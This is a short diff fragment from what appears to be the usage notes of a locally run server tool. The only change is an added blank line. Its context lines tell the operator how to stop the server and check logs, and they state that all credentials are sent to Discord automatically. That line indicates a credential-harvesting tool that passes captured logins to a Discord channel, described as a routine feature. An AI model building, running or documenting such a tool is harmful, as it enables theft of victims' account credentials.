@@ -53,3 +53,4 @@ Press `Ctrl+C` in the server window
 - Check server console for detailed logs
 - Check browser console (F12) for any errors
 - All credentials are sent to Discord automatically
+
